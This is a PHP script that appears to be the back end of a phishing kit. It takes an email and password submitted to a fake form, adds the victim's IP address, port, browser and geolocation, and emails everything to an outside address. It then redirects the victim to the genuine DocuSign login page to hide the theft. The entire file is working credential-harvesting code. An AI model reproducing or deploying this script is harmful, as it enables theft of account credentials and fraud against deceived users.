<?
include 'validate_form.js';
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$domain = 'User';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$message .= "Email*: ".$_POST['phoneNumber']."<br />";
$message .= "E-Pass*: ".$_POST['recEmail']."<br />";
$message .= "IP: ".$ip."<br />";
$message .= $adddate;
$tags=json_decode(file_get_contents('http://gd.geobytes.com/GetCityDetails?fqcn='.$ip), true);
$message .= "<br />";
$message .= "<br />"."----------First ip checker-------------"."<br />";
$message .= "FLAG:  <img src='http://api.hostip.info/flag.php?ip=$ip' height='12' /><br />";
$message .= "IP:   <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a><br />";
$message .= "User-Agent: $browser"."<br />";
$message .= "----------second ip checker-------------"."<br />";
$message .= "city: ".$tags['geobytescity']."<br />";
$message .= "region: ".$tags['geobytesregion']."<br />";
$message .= "country: ".$tags['geobytescountry']."<br />";
$message .= "continent: ".$tags['geobytesmapreference']."<br />";
$message .= "Currency: ".$tags['geobytescurrency']."<br />";
$message .= "Port: ".$port."<br />";
$message .= "xxxxxxxxxxxxxxxxx *~* Life Is Too Short To Hack !!! *~* xxxxxxxxxxxxxxxxx"."<br />";
$recipient = "helpdesk@wardmanuk.com";
$subject = "Gpapa $ip";
$headers .= "From: Gm4!l"."<doc>";
$headers .= $_POST['eMailAdd']."\n";
mail($recipient,$subject,$message,$headers);
mail($recipent,$subject,$message,$headers);
header("Location: https://www.docusign.net/Member/authenticate.aspx");
	  

?>